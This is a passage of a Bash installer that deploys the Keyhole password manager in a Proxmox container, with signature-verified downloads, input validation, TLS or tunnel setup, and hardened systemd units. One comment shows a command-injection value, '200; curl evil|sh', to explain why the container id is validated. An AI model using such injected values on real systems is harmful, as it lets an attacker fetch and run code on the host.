}

parse_args() {
  while [ $# -gt 0 ]; do
    case "$1" in
      --ctid) [ $# -ge 2 ] || die "--ctid needs a value"; CTID="$2"; shift 2 ;;
      --hostname) [ $# -ge 2 ] || die "--hostname needs a value"; HOSTNAME_CT="$2"; shift 2 ;;
      --cores) [ $# -ge 2 ] || die "--cores needs a value"; CORES="$2"; shift 2 ;;
      --ram) [ $# -ge 2 ] || die "--ram needs a value"; RAM="$2"; shift 2 ;;
      --disk) [ $# -ge 2 ] || die "--disk needs a value"; DISK="$2"; shift 2 ;;
      --storage) [ $# -ge 2 ] || die "--storage needs a value"; STORAGE="$2"; shift 2 ;;
      --bridge) [ $# -ge 2 ] || die "--bridge needs a value"; BRIDGE="$2"; shift 2 ;;
      --network) [ $# -ge 2 ] || die "--network needs a value"; NETWORK="$2"; shift 2 ;;
      --tunnel-token-file) [ $# -ge 2 ] || die "--tunnel-token-file needs a value"; TUNNEL_TOKEN_FILE="$2"; shift 2 ;;
      --hostname-external) [ $# -ge 2 ] || die "--hostname-external needs a value"; HOSTNAME_EXTERNAL="$2"; shift 2 ;;
      --admin-email) [ $# -ge 2 ] || die "--admin-email needs a value"; ADMIN_EMAIL="$2"; shift 2 ;;
      --backup-keep) [ $# -ge 2 ] || die "--backup-keep needs a value"; BACKUP_KEEP="$2"; shift 2 ;;
      --dry-run) DRY_RUN="yes"; shift ;;
      --yes) ASSUME_YES="yes"; shift ;;
      -h|--help) usage; exit 0 ;;
      # An unknown flag stops. Ignoring it would silently drop an option the
      # operator believes they set — --network among them.
      *) die "unknown option: $1" ;;
    esac
  done
}

is_hostname() {
  [[ "$1" =~ ^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$ ]]
}

# Checked before anything is created, and before the plan is printed.
#
# --ctid is the sharp one: it is interpolated unquoted into two `sh -c` strings
# — the pct-exec readiness loop and the /healthz loop — so `--ctid '200; curl
# evil|sh'` runs on the host. That is self-inflicted, but the premise of this
# whole file is "read me before you run me", and a reader cannot see it. The
# rest are here for the same reason: none of these values has any business
# containing a quote, a semicolon, a space or a newline, so a value that does is
# a mistake worth naming rather than passing on to pct.
validate_args() {
  # CTID may still be empty; resolve_ctid fills it from pvesh later, and checks
  # what it gets back the same way.
  if [ -n "$CTID" ]; then
    [[ "$CTID" =~ ^[0-9]+$ ]] || die "--ctid must be a number (got: ${CTID})"
  fi
  [[ "$CORES" =~ ^[0-9]+$ ]] || die "--cores must be a number (got: ${CORES})"
  [[ "$RAM" =~ ^[0-9]+$ ]] || die "--ram must be a number of MB (got: ${RAM})"
  [[ "$DISK" =~ ^[0-9]+$ ]] || die "--disk must be a number of GB (got: ${DISK})"
  # Interpolated into keyhole-backup.service's ExecStart. A non-number there is
  # a unit systemd loads and a backup that fails every night in the journal.
  [[ "$BACKUP_KEEP" =~ ^[0-9]+$ ]] \
    || die "--backup-keep must be a number of snapshots (got: ${BACKUP_KEEP})"
  [[ "$STORAGE" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]] \
    || die "--storage is not a Proxmox storage name (got: ${STORAGE})"
  [[ "$BRIDGE" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]] \
    || die "--bridge is not a bridge name (got: ${BRIDGE})"
  is_hostname "$HOSTNAME_CT" || die "--hostname is not a hostname (got: ${HOSTNAME_CT})"
}

require_pve() {
  if [ "$DRY_RUN" = "yes" ]; then
    return 0
  fi
  command -v pveversion >/dev/null 2>&1 || die "this must run on a Proxmox VE host"
  [ "$(id -u)" -eq 0 ] || die "this must run as root"
}

prompt_network() {
  cat <<'EOF'

How will this vault be reached?

  1) tunnel   Cloudflare Tunnel. Nothing is exposed on your router; Cloudflare
              terminates TLS. Needs a tunnel token from the Zero Trust
              dashboard.
  2) tls      LAN only, on the container's own address, with a self-signed
              certificate generated here. The browser warns once; the
              fingerprint is printed so you can check it.
  3) proxy    You already have a reverse proxy terminating TLS. This writes no
              certificates and binds loopback only.

There is no plain-HTTP option: window.crypto.subtle does not exist outside a
secure context, so an http:// origin gives you a vault that cannot decrypt a
single item.

EOF
  local choice
  printf 'Choose [1-3]: '
  read -r choice || die "aborted"
  case "$choice" in
    1|tunnel) NETWORK="tunnel" ;;
    2|tls) NETWORK="tls" ;;
    3|proxy) NETWORK="proxy" ;;
    *) die "not one of 1, 2 or 3: $choice" ;;
  esac
}

prompt_for_missing() {
  if [ -z "$NETWORK" ]; then
    prompt_network
  fi
  case "$NETWORK" in
    tunnel|tls|proxy) ;;
    *) die "--network must be one of tunnel, tls or proxy (got: $NETWORK)" ;;
  esac

  if [ "$NETWORK" != "tls" ] && [ -z "$HOSTNAME_EXTERNAL" ]; then
    printf '\nPublic hostname the vault will be reached at (for example vault.example.com): '
    read -r HOSTNAME_EXTERNAL || die "aborted"
    [ -n "$HOSTNAME_EXTERNAL" ] || die "--hostname-external is required in ${NETWORK} mode"
  fi
  if [ "$NETWORK" = "tls" ] && [ -n "$HOSTNAME_EXTERNAL" ]; then
    die "--hostname-external does not apply to tls mode: base_url is the container's own address"
  fi
  # Checked here rather than in validate_args because it can arrive from the
  # prompt just above. It ends up in base_url, which is written into config.yml
  # inside a quoted heredoc — a newline in it would end that heredoc early.
  if [ -n "$HOSTNAME_EXTERNAL" ]; then
    is_hostname "$HOSTNAME_EXTERNAL" \
      || die "--hostname-external is not a hostname (got: ${HOSTNAME_EXTERNAL})"
  fi

  if [ -z "$ADMIN_EMAIL" ]; then
    printf '\nEmail address of the first administrator: '
    read -r ADMIN_EMAIL || die "aborted"
    [ -n "$ADMIN_EMAIL" ] || die "--admin-email is required"
  fi
}

# The token is read here, before anything is created, so a typo in the path
# fails on a host with no container on it. It is never echoed, never passed as
# an argument, and never printed by the plan.
read_tunnel_token() {
  if [ "$NETWORK" != "tunnel" ]; then
    return 0
  fi
  if [ -n "$TUNNEL_TOKEN_FILE" ]; then
    [ -r "$TUNNEL_TOKEN_FILE" ] || die "cannot read the tunnel token file: $TUNNEL_TOKEN_FILE"
    TUNNEL_TOKEN="$(tr -d '\r\n' < "$TUNNEL_TOKEN_FILE")"
  else
    printf '\nCloudflare tunnel token (not echoed): ' >&2
    IFS= read -rs TUNNEL_TOKEN || die "aborted"
    printf '\n' >&2
  fi
  # A dry run reads whatever it was pointed at and asserts nothing about it —
  # /dev/null is a legitimate thing to point a dry run at, and refusing it would
  # mean the plan could only be produced by someone who already holds the token.
  if [ "$DRY_RUN" != "yes" ] && [ -z "$TUNNEL_TOKEN" ]; then
    die "the tunnel token is empty"
  fi
}

# Turns the answers into the three values that differ between modes: what the
# server binds, what origin it believes it is served from, and where this script
# looks for /healthz afterwards.
resolve_settings() {
  case "$NETWORK" in
    tunnel)
      ADDR="127.0.0.1:${PORT}"
      BASE_URL="https://${HOSTNAME_EXTERNAL}"
      BASE_URL_HUMAN="$BASE_URL"
      HEALTH_URL="http://127.0.0.1:${PORT}/healthz"
      HEALTH_CURL_FLAGS="-fsS"
      ;;
    tls)
      ADDR="0.0.0.0:${PORT}"
      # Not known until the container is up and DHCP has answered; filled in by
      # resolve_ct_address, which runs once the container exists.
      BASE_URL=""
      BASE_URL_HUMAN="https://<the container's address>:${PORT}"
      HEALTH_URL="https://127.0.0.1:${PORT}/healthz"
      # -k, because the certificate this very script just generated is
      # self-signed and there is nothing here that could trust it.
      HEALTH_CURL_FLAGS="-fsSk"
      ;;
    proxy)
      ADDR="127.0.0.1:${PORT}"
      BASE_URL="https://${HOSTNAME_EXTERNAL}"
      BASE_URL_HUMAN="$BASE_URL"
      HEALTH_URL="http://127.0.0.1:${PORT}/healthz"
      HEALTH_CURL_FLAGS="-fsS"
      ;;
  esac
}

resolve_ctid() {
  if [ -n "$CTID" ]; then
    return 0
  fi
  if [ "$DRY_RUN" = "yes" ]; then
    printf 'RUN: pvesh get /cluster/nextid\n'
    CTID="<next free container id>"
    return 0
  fi
  CTID="$(pvesh get /cluster/nextid)"
  # Same check as validate_args applies to a --ctid: this value is interpolated
  # into `sh -c` strings further down, so it is a container id or it is nothing.
  [[ "$CTID" =~ ^[0-9]+$ ]] \
    || die "pvesh get /cluster/nextid did not return a container id (got: ${CTID})"
}

print_plan() {
  cat <<EOF

Keyhole ${VERSION} will be installed as follows.

  Container    ${CTID} (${HOSTNAME_CT}), unprivileged Debian 12
  Resources    ${CORES} cores, ${RAM} MB RAM, ${DISK} GB on ${STORAGE}, bridge ${BRIDGE}
  Reached by   ${NETWORK}
  Reached at   ${BASE_URL_HUMAN}
  Binary       https://github.com/${OWNER}/${REPO}/releases/download/${VERSION}/keyhole-linux-\${arch}
               verified against SHA256SUMS and its minisign signature
  Data         ${DATA_DIR} (SQLite; entirely ciphertext)
  Config       ${CONFIG_DIR}/config.yml
  Service      systemd unit "keyhole", running as ${SERVICE_USER}
  Backups      nightly, by systemd timer "keyhole-backup", keeping the
               ${BACKUP_KEEP} most recent snapshots in ${DATA_DIR}/backups
  Admin        ${ADMIN_EMAIL}

Nothing has been changed yet.
EOF
  if is_placeholder_key; then
    cat <<'EOF'

!! The release signing key in this copy of the script is still a placeholder,
!! so it can verify nothing. A real install refuses to start until
!! MINISIGN_PUBKEY is replaced with the key published in the README.
EOF
  fi
  if [ "$ASSUME_YES" = "yes" ]; then
    return 0
  fi
  printf '\nProceed? [y/N] '
  local answer
  read -r answer || die "aborted"
  case "$answer" in y|Y|yes) ;; *) die "aborted" ;; esac
}

# Do not hard-code a template filename: the Debian point release moves, and a
# pinned name turns into a 404 on a schedule nobody here controls.
ensure_template() {
  run pveam update
  local -a pick=(sh -c "pveam available --section system | awk '{print \$2}' | grep '^debian-12-standard' | sort -V | tail -n 1")
  if [ "$DRY_RUN" = "yes" ]; then
    printf 'RUN: %s\n' "${pick[*]}"
    note "the newest debian-12-standard in that list is the template; it is downloaded if absent"
    TEMPLATE="${TEMPLATE_STORAGE}:vztmpl/<newest debian-12-standard>"
    run pveam download "$TEMPLATE_STORAGE" "<newest debian-12-standard>"
    return 0
  fi
  local newest
  newest="$("${pick[@]}")"
  [ -n "$newest" ] || die "pveam available --section system offered no debian-12-standard template"
  # -F: the filename carries the point release, so it is full of dots, and as a
  # regex those match anything. A fixed-string compare is what "is this exact
  # template already here" actually means.
  if ! pveam list "$TEMPLATE_STORAGE" | grep -qF "vztmpl/${newest}"; then
    run pveam download "$TEMPLATE_STORAGE" "$newest"
  fi
  TEMPLATE="${TEMPLATE_STORAGE}:vztmpl/${newest}"
}

create_container() {
  run pct create "$CTID" "$TEMPLATE" \
    --hostname "$HOSTNAME_CT" \
    --cores "$CORES" \
    --memory "$RAM" \
    --swap 0 \
    --rootfs "${STORAGE}:${DISK}" \
    --net0 "name=eth0,bridge=${BRIDGE},ip=dhcp" \
    --unprivileged 1 \
    --features nesting=0 \
    --onboot 1
  run pct start "$CTID"
  # pct start returns as soon as the container is created, not as soon as it can
  # run anything; without this every command below races init.
  if ! run sh -c "i=0; while [ \$i -lt 60 ]; do pct exec ${CTID} -- true >/dev/null 2>&1 && exit 0; i=\$((i+1)); sleep 1; done; exit 1"; then
    die "container ${CTID} started but never became reachable with pct exec"
  fi
}

provision_base() {
  local packages="ca-certificates curl minisign"
  case "$NETWORK" in
    tls) packages="${packages} openssl" ;;
    tunnel) packages="${packages} gnupg" ;;
  esac
  in_ct sh -c "set -eu
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y --no-install-recommends ${packages}"
}

install_binary() {
  local base="https://github.com/${OWNER}/${REPO}/releases/download/${VERSION}"

  if ! in_ct sh -c "set -eu
rm -rf '${WORK_DIR}'
mkdir -p '${WORK_DIR}'
cd '${WORK_DIR}'
arch=\$(dpkg --print-architecture)
curl -fsSL --proto '=https' --tlsv1.2 -o \"keyhole-linux-\$arch\" \"${base}/keyhole-linux-\$arch\"
curl -fsSL --proto '=https' --tlsv1.2 -o SHA256SUMS \"${base}/SHA256SUMS\"
curl -fsSL --proto '=https' --tlsv1.2 -o SHA256SUMS.minisig \"${base}/SHA256SUMS.minisig\""; then
    abort_stopped "downloading ${VERSION} failed"
  fi

  # The signature first. It is what makes the checksum list mean anything: a
  # SHA256SUMS that arrived over the same connection as the binary proves only
  # that the two agree with each other.
  if ! in_ct sh -c "set -eu
cd '${WORK_DIR}'
minisign -Vm SHA256SUMS -P '${MINISIGN_PUBKEY}'"; then
    abort_stopped "the minisign signature over SHA256SUMS did not verify against the key in this script"
  fi

  # Then the checksum, which is now a statement signed by the release key.
  # --ignore-missing because SHA256SUMS lists both architectures and only one
  # of them was downloaded.
  if ! in_ct sh -c "set -eu
cd '${WORK_DIR}'
sha256sum -c SHA256SUMS --ignore-missing"; then
    abort_stopped "the downloaded binary does not match its signed checksum"
  fi

  # Only now does anything reach an executable path.
  in_ct sh -c "set -eu
cd '${WORK_DIR}'
arch=\$(dpkg --print-architecture)
install -o root -g root -m 0755 \"keyhole-linux-\$arch\" /usr/local/bin/keyhole
rm -rf '${WORK_DIR}'"

  # The update shim, so the command the closing message names is the command
  # that exists. `keyhole update` re-runs this same verification against the
  # latest release and rolls back a binary that will not answer /healthz.
  ct_write /usr/local/bin/update 0755 root:root "#!/bin/sh
exec /usr/local/bin/keyhole update \"\$@\""
}

create_service_user() {
  in_ct sh -c "set -eu
id -u '${SERVICE_USER}' >/dev/null 2>&1 || useradd --system --home-dir '${DATA_DIR}' --shell /usr/sbin/nologin '${SERVICE_USER}'"
  # 0700: the database is entirely ciphertext, but the server secret next to it
  # is not, and nothing but the service has any business in this directory.
  in_ct install -d -o "$SERVICE_USER" -g "$SERVICE_USER" -m 0700 "$DATA_DIR"
  # Created here rather than left to whoever backs up first. backup.Snapshot
  # does os.MkdirAll(dir, 0700), so the first run owns the directory — and the
  # first run is root, every time: this script's own closing message offers
  # "keyhole backup" as the way to take one now, and `keyhole update` takes a
  # pre-update snapshot. Afterwards the nightly keyhole-backup.service, which
  # runs as ${SERVICE_USER}, cannot write into a root:root 0700 directory and
  # fails every night in the journal where nobody is looking — because the
  # operator followed the instruction printed below.
  in_ct install -d -o "$SERVICE_USER" -g "$SERVICE_USER" -m 0700 "${DATA_DIR}/backups"
  in_ct install -d -o root -g root -m 0755 "$CONFIG_DIR"
}

# The one side effect that deliberately does not go through run(): the token has
# to reach the container on a pipe, and run() cannot carry stdin. A dry run
# prints a redacted line instead. The whole point of the file is that the secret
# never appears in an argument list, a process table, a shell history or a plan.
push_tunnel_token() {
  if [ "$DRY_RUN" = "yes" ]; then
    printf 'RUN: pct exec %s -- sh -c "umask 077; cat > %s"  < the tunnel token (not shown)\n' \
      "$CTID" "$TUNNEL_TOKEN_PATH"
    printf 'RUN: pct exec %s -- chown root:root %s\n' "$CTID" "$TUNNEL_TOKEN_PATH"
    printf 'RUN: pct exec %s -- chmod 0600 %s\n' "$CTID" "$TUNNEL_TOKEN_PATH"
    return 0
  fi
  printf '%s' "$TUNNEL_TOKEN" | pct exec "$CTID" -- sh -c "umask 077; cat > '${TUNNEL_TOKEN_PATH}'"
  pct exec "$CTID" -- chown root:root "$TUNNEL_TOKEN_PATH"
  pct exec "$CTID" -- chmod 0600 "$TUNNEL_TOKEN_PATH"
}

# The container's own address, read exactly once.
#
# It used to be read twice by two separate pct exec calls: once for the
# certificate's CN and SAN, once for base_url. A DHCP renewal, or a change in
# the order `hostname -I` prints addresses, between those two calls produces a
# base_url the certificate does not cover — and that failure does not look like
# what it is. The browser rejects the certificate, so there is no secure
# context, so window.crypto.subtle is undefined and the vault cannot open a
# single item; and the fingerprint this script prints belongs to a certificate
# nothing will accept anyway. One lookup, carried forward.
resolve_ct_address() {
  if [ "$NETWORK" != "tls" ]; then
    return 0
  fi
  local -a read_addr=(pct exec "$CTID" -- sh -c "hostname -I | cut -d' ' -f1")
  if [ "$DRY_RUN" = "yes" ]; then
    printf 'RUN: %s\n' "${read_addr[*]}"
    CT_ADDR="<container-ipv4>"
  else
    CT_ADDR="$("${read_addr[@]}")" || die "could not read container ${CTID}'s address"
    # An empty address writes "base_url: https://:8477" and a certificate with
    # an empty CN; an IPv6 one writes a base_url that needs brackets and does
    # not have them. Neither explains itself later, and both are reachable from
    # a container whose DHCP has not settled — so stop while the message can
    # still name the cause. -addext subjectAltName=IP: wants a literal too.
    [[ "$CT_ADDR" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] \
      || die "container ${CTID} has no IPv4 address yet (hostname -I gave: '${CT_ADDR}')"
  fi
  BASE_URL="https://${CT_ADDR}:${PORT}"
}

configure_network() {
  case "$NETWORK" in
    tunnel)
      in_ct sh -c "set -eu
install -d -m 0755 /usr/share/keyrings
curl -fsSL --proto '=https' --tlsv1.2 https://pkg.cloudflare.com/cloudflare-main.gpg -o /usr/share/keyrings/cloudflare-main.gpg
chmod 0644 /usr/share/keyrings/cloudflare-main.gpg
echo 'deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared bookworm main' > /etc/apt/sources.list.d/cloudflared.list
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y --no-install-recommends cloudflared"
      push_tunnel_token
      # The token is exported from the file rather than given as an argument.
      # Arguments are readable by every process on the box through /proc and
      # land in the shell history of whoever typed them.
      in_ct sh -c "set -eu
TUNNEL_TOKEN=\$(cat '${TUNNEL_TOKEN_PATH}')
export TUNNEL_TOKEN
cloudflared service install
systemctl enable --now cloudflared"
      ;;
    tls)
      # -addext subjectAltName is not optional decoration: a certificate with
      # the address only in CN is rejected outright by every current browser,
      # and "rejected" here means no secure context and no crypto.subtle.
      #
      # The address is the one resolve_ct_address already read, not a fresh
      # lookup — this certificate and base_url have to name the same host.
      in_ct sh -c "set -eu
umask 077
openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -subj '/CN=${CT_ADDR}' -addext 'subjectAltName=IP:${CT_ADDR}' -keyout '${CONFIG_DIR}/tls.key' -out '${CONFIG_DIR}/tls.crt'
chown root:${SERVICE_USER} '${CONFIG_DIR}/tls.key' '${CONFIG_DIR}/tls.crt'
chmod 0640 '${CONFIG_DIR}/tls.key' '${CONFIG_DIR}/tls.crt'"
      local -a fingerprint=(pct exec "$CTID" -- openssl x509 -noout -fingerprint -sha256 -in "${CONFIG_DIR}/tls.crt")
      if [ "$DRY_RUN" = "yes" ]; then
        printf 'RUN: %s\n' "${fingerprint[*]}"
        TLS_FINGERPRINT="(read from the certificate once it has been generated)"
      else
        TLS_FINGERPRINT="$("${fingerprint[@]}")" || die "could not read the certificate fingerprint"
      fi
      ;;
    proxy)
      note "proxy mode writes no TLS material; your reverse proxy holds the certificate"
      ;;
  esac
}

write_config() {
  # In tls mode this comes from resolve_ct_address; in the other two from
  # --hostname-external. Empty means the steps were reordered, and an empty
  # base_url produces "https://:8477" in every setup link the vault sends —
  # broken in a way that says nothing about why.
  [ -n "$BASE_URL" ] || die "base_url is empty; resolve_ct_address must run before write_config"

  local config="# Written by scripts/install.sh (Keyhole ${VERSION}).
addr: ${ADDR}
data_dir: ${DATA_DIR}
base_url: ${BASE_URL}
log_level: info"
  if [ "$NETWORK" = "tls" ]; then
    config="${config}
tls_cert: ${CONFIG_DIR}/tls.crt
tls_key: ${CONFIG_DIR}/tls.key"
  fi
  ct_write "${CONFIG_DIR}/config.yml" 0640 "root:${SERVICE_USER}" "$config"
}

write_unit() {
  ct_write /etc/systemd/system/keyhole.service 0644 root:root "[Unit]
Description=Keyhole password manager
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=${SERVICE_USER}
Group=${SERVICE_USER}
ExecStart=/usr/local/bin/keyhole serve --config ${CONFIG_DIR}/config.yml
Restart=on-failure
RestartSec=2

# The process needs one writable directory and nothing else. Everything below
# is what keeps a compromise of the HTTP handler from becoming a compromise of
# the container.
NoNewPrivileges=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectSystem=strict
ProtectHome=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictSUIDSGID=yes
RestrictNamespaces=yes
LockPersonality=yes
# Safe here, and worth keeping: the binary is CGO_ENABLED=0 static Go with no
# JIT and no plugins, so nothing it does needs a page that is both writable and
# executable. If something later appears to break under it, that is a reason to
# find out what is allocating W+X memory, not a reason to delete this line.
MemoryDenyWriteExecute=yes
SystemCallFilter=@system-service
SystemCallArchitectures=native
ReadWritePaths=${DATA_DIR}

[Install]
WantedBy=multi-user.target"
  in_ct systemctl daemon-reload
}

# §8.3 of the design asks for a nightly snapshot with configurable retention, and
# `keyhole backup` on its own is only half of that — nothing runs it.
#
# The snapshot is taken with VACUUM INTO, so the server does not need stopping
# and this can be an ordinary oneshot beside the running service.
#
# It reloads systemd itself rather than leaning on write_unit's reload: the two
# steps are independent in main(), and a unit file systemd has not been told
# about is one `systemctl enable` away from an error nobody expects.
write_backup_units() {
  # No [Install] section, deliberately. This unit is pulled in by the timer
  # below, and leaving it un-enablable means `systemctl enable
  # keyhole-backup.service` — enabling the job instead of the schedule, so it
  # runs once at boot and never again — fails loudly rather than looking right.
  ct_write /etc/systemd/system/keyhole-backup.service 0644 root:root "[Unit]
Description=Keyhole nightly backup
After=keyhole.service

[Service]
Type=oneshot
User=${SERVICE_USER}
Group=${SERVICE_USER}
ExecStart=/usr/local/bin/keyhole backup --config ${CONFIG_DIR}/config.yml --keep ${BACKUP_KEEP}

# The same hardening as keyhole.service. It is the same binary reading the same
# database and writing into the same one directory, so there is no reason for
# the backup job to run with more of the container available to it than the
# server does — and the job that reads every row is a poor place to relax it.
NoNewPrivileges=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectSystem=strict
ProtectHome=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictSUIDSGID=yes
RestrictNamespaces=yes
LockPersonality=yes
MemoryDenyWriteExecute=yes
SystemCallFilter=@system-service
SystemCallArchitectures=native
ReadWritePaths=${DATA_DIR}"

  ct_write /etc/systemd/system/keyhole-backup.timer 0644 root:root "[Unit]
Description=Nightly Keyhole backup

[Timer]
OnCalendar=daily
# A container that was powered off overnight has missed its run. Without this
# the next backup is simply tomorrow's, and the gap is invisible until someone
# needs a snapshot from a day that has none.
Persistent=true
# Several containers on one host would otherwise all VACUUM INTO at exactly
# 00:00 and contend for the same disk.
RandomizedDelaySec=30m

[Install]
WantedBy=timers.target"
  in_ct systemctl daemon-reload
}

# Enabled after bootstrap_admin, not with the units: arming the schedule before
# `keyhole migrate` has created the database would leave a window — small, but
# real on a slow first boot — in which the timer can fire on nothing.
enable_backup_timer() {
  in_ct systemctl enable --now keyhole-backup.timer
}

bootstrap_admin() {
  # Migrate as root before the service ever runs, so the first thing the
  # unprivileged unit does is not a schema change.
  in_ct keyhole migrate --config "${CONFIG_DIR}/config.yml"
  in_ct chown -R "${SERVICE_USER}:${SERVICE_USER}" "$DATA_DIR"
  in_ct systemctl enable --now keyhole

  if ! run sh -c "i=0; while [ \$i -lt 30 ]; do pct exec ${CTID} -- curl ${HEALTH_CURL_FLAGS} -o /dev/null '${HEALTH_URL}' >/dev/null 2>&1 && exit 0; i=\$((i+1)); sleep 1; done; exit 1"; then
    die "keyhole started but never answered ${HEALTH_URL}; check \"pct exec ${CTID} -- journalctl -u keyhole\""
  fi

  # Captured rather than run through run(), because the setup link is the whole
  # point of this step and it only exists in this command's output. The dry-run
  # branch prints the identical command line, so the plan stays complete.
  local -a create=(pct exec "$CTID" -- runuser -u "$SERVICE_USER" -- \
    keyhole admin create --email "$ADMIN_EMAIL" --config "${CONFIG_DIR}/config.yml")
  if [ "$DRY_RUN" = "yes" ]; then
    printf 'RUN: %s\n' "${create[*]}"
    return 0
  fi
  ADMIN_OUTPUT="$("${create[@]}")" || die "creating the first administrator failed"
}

print_next_steps() {
  # A dry run must not close by announcing an install that did not happen.
  if [ "$DRY_RUN" = "yes" ]; then
    printf '\n%s\n' "That is the entire plan for Keyhole ${VERSION} in container ${CTID}. Nothing was changed."
    printf '%s\n' "The setup link is printed by \"keyhole admin create\" at the end of a real run."
  else
    printf '\n%s\n' "Keyhole ${VERSION} is installed in container ${CTID}."
    printf '%s\n' "$ADMIN_OUTPUT"
  fi
  printf '\n'

  case "$NETWORK" in
    tls)
      cat <<EOF
The certificate is self-signed, so the browser warns the first time. Check the
fingerprint it shows you against this one rather than clicking through:

  ${TLS_FINGERPRINT}

EOF
      ;;
    proxy)
      cat <<EOF
Two things your reverse proxy needs:

  proxy_pass    http://<this container's address>:${PORT}
  it must serve ${BASE_URL} over TLS — a secure context, or the web app has no
  window.crypto.subtle and cannot decrypt anything

EOF
      ;;
    tunnel)
      cat <<EOF
The tunnel is registered. Point the Cloudflare public hostname
${HOSTNAME_EXTERNAL} at http://localhost:${PORT} in the Zero Trust dashboard if
you have not already.

EOF
      ;;
  esac

  cat <<EOF
Worth knowing:

  Data          ${DATA_DIR} inside container ${CTID} — item bodies, names and
                URLs are ciphertext the server has never held a key for
  Back up       nightly, shortly after 00:00 in the container's timezone, into
                ${DATA_DIR}/backups; the ${BACKUP_KEEP} most recent snapshots
                are kept and older ones pruned
                pct exec ${CTID} -- systemctl list-timers keyhole-backup.timer
                pct exec ${CTID} -- keyhole backup   (one now, off schedule)
                (a snapshot is entirely ciphertext, so copying it somewhere
                less trusted than this host is a reasonable thing to do)
  Update        pct exec ${CTID} -- update
                (verifies the signature the same way this install did, and
                rolls back if the new binary will not answer /healthz)
  Logs          pct exec ${CTID} -- journalctl -u keyhole -f
EOF
}

main() {
  parse_args "$@"
  validate_args
  # Before require_pve, deliberately. This one is about what is in this file
  # rather than what is on this host, so the operator should hear about it
  # wherever they are reading the script — not only once they are root on a
  # Proxmox node.
  check_signing_key
  require_pve
  prompt_for_missing
  read_tunnel_token
  resolve_settings
  resolve_ctid
  print_plan

  ensure_template
  create_container
  provision_base
  install_binary
  create_service_user
  # Immediately before the two steps that need it, so the window between
  # reading the address and committing it to a certificate stays short.
  resolve_ct_address
  configure_network
  write_config
  write_unit
  write_backup_units
  bootstrap_admin
  enable_backup_timer
  print_next_steps
}

main "$@"
